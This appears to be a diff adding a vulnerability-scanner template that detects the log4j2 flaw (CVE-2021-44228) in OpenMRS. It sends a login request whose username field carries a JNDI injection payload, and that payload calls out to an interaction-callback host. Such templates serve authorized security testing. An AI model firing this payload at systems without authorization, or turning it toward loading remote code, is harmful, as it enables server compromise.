@@ -1,0 +1,41 @@
+id: cve-2021-44228
+info:
+  name: OpenMRS log4j2 Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    OpenMRS has a log4j2 remote command execution vulnerability (CVE-2021-44228). Attackers can exploit this vulnerability to execute arbitrary commands on the server side, obtaining server permissions and control over the web server.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  tags: log4j2, rce, critical
+  metadata:
+    poc-id: 6857
+
+variables:
+  check_str: "{{rand_base(4)}}"
+
+http:
+  - raw:
+      - |
+        POST /openmrs/ms/legacyui/loginServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        uname=2${jndi:ldap://{{interactsh-url}}}&pw=1&redirect=%2Fopenmrs%2F&refererURL=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: header
+        regex:
+          - "text/html"
+    stop-at-first-match: true
